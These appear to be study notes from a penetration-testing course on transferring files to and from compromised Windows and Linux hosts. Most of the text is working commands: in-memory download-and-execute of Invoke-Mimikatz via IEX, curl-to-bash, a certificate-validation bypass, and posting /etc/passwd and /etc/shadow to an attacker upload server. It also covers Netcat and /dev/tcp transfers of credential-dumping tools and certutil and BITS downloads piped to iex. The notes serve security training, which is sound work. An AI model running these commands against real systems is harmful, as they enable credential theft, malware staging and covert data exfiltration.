                -----------Windows-----------------
                
                
                
                -----PowerShell Base64 Encode & Decode

     If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.


     check md5sum first just to verify file is the same later

     - $ md5sum id_rsa

     $ cat id_rsa |base64 -w 0;echo

     We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.

     PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\{file_name}", [Convert]::FromBase64String("base64_string"))

     Finally, we can confirm if the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does.

     PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

     !!!!Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings. 


                
                ---PowerShell Web Downloads (USING HTYP/HTTPS)

    
    Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. 
    PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:


    Method 	                    Description

OpenRead 	            Returns the data from a resource as a Stream.
OpenReadAsync 	        Returns the data from a resource without blocking the calling thread.
DownloadData 	        Downloads data from a resource and returns a Byte array.
DownloadDataAsync 	    Downloads data from a resource and returns a Byte array without blocking the calling thread.

DownloadFile 	        Downloads data from a resource to a local file.

DownloadFileAsync 	    Downloads data from a resource to a local file without blocking the calling thread.

DownloadString 	        Downloads a String from a resource and returns a String.
DownloadStringAsync 	Downloads a String from a resource without blocking the calling thread.


        -PowerShell DownloadFile Method


    We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.

    PS C:\htb> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
    PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

     
        
        -PowerShell DownloadString - Fileless Method

    fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.

    PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

    -IEX also accepts pipeline input.

    PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX



            -PowerShell Invoke-WebRequest

    You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.

    PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1


    also check https://gist.github.com/HarmJ0y/bb48307ffa663256e239

    

            ---Common Errors with PowerShell

    -There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
    This can be bypassed using the parameter -UseBasicParsing.

    PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

    
    -Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

    PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}




                    ----SMB Downloads

    We need to create an SMB server in our Pwnbox with smbserver.py from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.

    $ sudo impacket-smbserver share -smb2support /tmp/smbshare

    to download a file from the SMB server to the current working directory, we can use the following command:

    C:\htb> copy \\192.168.220.133\share\nc.exe


    -Create the SMB Server with a Username and Password

    $ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

    C:\htb> net use n: \\192.168.220.133\share /user:test test


    !!!Note: You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.



                ----FTP Downloads


    We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.

    We can configure an FTP Server in our attack host using Python3 pyftpdlib module. It can be installed with the following command:

    $ sudo pip3 install pyftpdlib

    Then we can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.

    $ sudo python3 -m pyftpdlib --port 21

    PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')


                ---Non interactive shell
    -When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

    C:\htb> echo open 192.168.49.128 > ftpcommand.txt
    C:\htb> echo USER anonymous >> ftpcommand.txt
    C:\htb> echo binary >> ftpcommand.txt
    C:\htb> echo GET file.txt >> ftpcommand.txt
    C:\htb> echo bye >> ftpcommand.txt
    C:\htb> ftp -v -n -s:ftpcommand.txt
    ftp> open 192.168.49.128
    Log in with USER and PASS first.
    ftp> USER anonymous

    ftp> GET file.txt
    ftp> bye

            
            
            
            
                ------Upload Operations


    ----PowerShell Base64 Encode & Decode

    Encode File Using PowerShell
    
    PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

    PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

    
    
            -PowerShell Web Uploads

    PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.
    For our web server, we can use uploadserver, an extended module of the Python HTTP.server module, which includes a file upload page. Let's install it and start the webserver.
    
    $ pip3 install uploadserver
    $ python3 -m uploadserver

    Now we can use a PowerShell script PSUpload.ps1 which uses Invoke-WebRequest to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.

    PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
    PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts


            -PowerShell Base64 Web Upload
    
    Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

    PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

    PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

    We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.


            --SMB Uploads

    run SMB over HTTP with WebDav. WebDAV (RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.

    !!!When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. 


    To set up our WebDav server, we need to install two Python modules, wsgidav and cheroot
    After installing them, we run the wsgidav application in the target directory.

    $ sudo pip install wsgidav cheroot
    $ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

    Connecting to the Webdav Share

    C:\htb> dir \\192.168.49.128\DavWWWRoot



    !!!Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

    You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

            
            --Uploading Files using SMB

    C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
    C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\

    !Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.



                    ----FTP Uploads

    Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module pyftpdlib, we need to specify the option --write to allow clients to upload files to our attack host.

    $ sudo python3 -m pyftpdlib --port 21 --write

    Now let's use the PowerShell upload function to upload a file to our FTP Server.

    PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')



    



                        -------------Linux-------------

                    

            ------Download a File Using wget
    
    $ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh


    cURL is very similar to wget, but the output filename option is lowercase `-o'.

    $ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh


            -----Fileless Attacks Using Linux


    Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

    !Note: Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload choosen it may create temporary files on the OS.


                ----Fileless Download with cURL

    $ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash


                ------Fileless Download with wget

    $ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3



                ------Download with Bash (/dev/tcp)


    There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.


    $ exec 3<>/dev/tcp/10.10.10.32/80

    --HTTP GET Request
    $ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
    $ cat <&3


                ----SSH Downloads

    SCP (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

    SCP is very similar to copy or cp, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.
    
    $ scp plaintext@192.168.49.128:/root/myroot.txt .

    Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer. 
    

                ----Upload Operations

    --Web Upload

    $ python3 -m pip install --user uploadserver

    --Pwnbox - Create a Self-Signed Certificate

    $ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

    !The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

    $ mkdir https && cd https

    $ python3 -m uploadserver 443 --server-certificate /path/to/certificate

    Now from our compromised machine, let's upload the /etc/passwd and /etc/shadow files.

    $ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

    We used the option --insecure because we used a self-signed certificate that we trust.


    ---php

    $ php -S 0.0.0.0:8000

    ---ruby 

    $ ruby -run -ehttpd . -p8000

    ---File Upload using SCP

    $ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/

    !Note: Remember that scp syntax is similar to cp or copy.
    




                        -----Python

     $ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'


                        -----PHP

     $ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'


     $ php -r 'const BUFFER = 1024; $fremote = 
     fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

     -PHP Download a File and Pipe it to Bash

     $ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash



                        -----Perl - Download a File

    $ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'

                        ----JavaScript

JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.

The following JavaScript code is based on this post, and we can download a file using it. We'll create a file called wget.js and save the following content:

        var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
        WinHttpReq.Send();
        BinStream = new ActiveXObject("ADODB.Stream");
        BinStream.Type = 1;
        BinStream.Open();
        BinStream.Write(WinHttpReq.ResponseBody);
        BinStream.SaveToFile(WScript.Arguments(1));

We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.

C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1


                        -----VBScript

VBScript ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.

The following VBScript example can be used based on this. We'll create a file called wget.vbs and save the following content:

                dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
                dim bStrm: Set bStrm = createobject("Adodb.Stream")
                xHttp.Open "GET", WScript.Arguments.Item(0), False
                xHttp.Send

                with bStrm
                        .type = 1
                        .open
                        .write xHttp.responseBody
                        .savetofile WScript.Arguments.Item(1), 2
                end with


C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1




                -----Uploading a File Using a Python One-liner


        from the attack machine:
        $ python3 -m uploadserver


        from the target machine:
        $ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'




                        ----Netcat

        
        from the compromised machine:

        $ nc -l -p 8000 > SharpKatz.exe

        or

        $ ncat -l -p 8000 --recv-only > SharpKatz.exe

        From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat. The option -q 0 will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

        $ nc -q 0 192.168.49.128 8000 < SharpKatz.exe

        or

        $ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe



        ---the compromised machine connects back to the attack machine

        from the attack machine:

        $ sudo nc -l -p 443 -q 0 < SharpKatz.exe

        or

        $ sudo ncat -l -p 443 --send-only < SharpKatz.exe

        from the compromised:

        $ nc 192.168.49.128 443 > SharpKatz.exe

        or

        $ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe


        -Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

        $ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe


                        -----PowerShell Session File Transfer

        
        We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use PowerShell Remoting, aka WinRM, to perform file transfer operations.


        To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from DC01 to DATABASE01 and vice versa.

        We have a session as Administrator in DC01, the user has administrative rights on DATABASE01, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.


        - From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

        PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

        Because this session already has privileges over DATABASE01, we don't need to specify credentials. In the example below, a session is created to the remote computer named DATABASE01 and stores the results in the variable named $Session.


        -Create a PowerShell Remoting Session to DATABASE01

        PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01


        -We can use the Copy-Item cmdlet to copy a file from our local machine DC01 to the DATABASE01 session we have $Session or vice versa.

        -Copy samplefile.txt from our Localhost to the DATABASE01 Session

        PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

        -Copy DATABASE.txt from DATABASE01 Session to our Localhost

        PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session



                                ----RDP

        -Mounting a Linux Folder Using rdesktop

        $ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

        -Mounting a Linux Folder Using xfreerdp

        $ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer

        !To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.

        Alternatively, from Windows, the native mstsc.exe remote desktop client can be used.

        




                        -----Enabling webservers


                ---enabling uploads with nginx

        -Create a Directory to Handle Uploaded Files

        $ sudo mkdir -p /var/www/uploads/SecretUploadDirectory

        -Change the Owner to www-data

        $ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

        -Create Nginx Configuration File

        Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents:

server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}


        -Symlink our Site to the sites-enabled Directory

        $ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

        -Start Nginx

        $ sudo systemctl restart nginx.service

        !If we get any error messages, check /var/log/nginx/error.log. If using Pwnbox, we will see port 80 is already in use.

        $ tail -2 `/var/log/nginx/error.log`

        -Remove NginxDefault Configuration if u get errors about the port 

        $ sudo rm /etc/nginx/sites-enabled/default

        Now we can test uploading by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt

        -Upload File Using cURL

        $ curl -T /etc/passwd

        $ tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 

        Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory. By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks to Nginx being minimal, features like that are not enabled by default.



                        -----user agents

        --Invoke-WebRequest -----WindowsPowerShell/5.1.14393.0
        PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"


        --WinHttpRequest ------Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
                PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
                PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
                PS C:\htb> $h.send();
                PS C:\htb> iex $h.ResponseText


        --Msxml2 -----Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
                PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
                PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
                PS C:\htb> $h.send();
                PS C:\htb> iex $h.responseText


        --Certutil -------- Microsoft-CryptoAPI/10.0
                PS C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
                PS C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe

        --BITS ---------Microsoft BITS/7.8

                PS C:\htb> Import-Module bitstransfer;
                PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
                PS C:\htb> $r=gc $env:temp\t;
                PS C:\htb> rm $env:temp\t; 
                PS C:\htb> iex $r

                





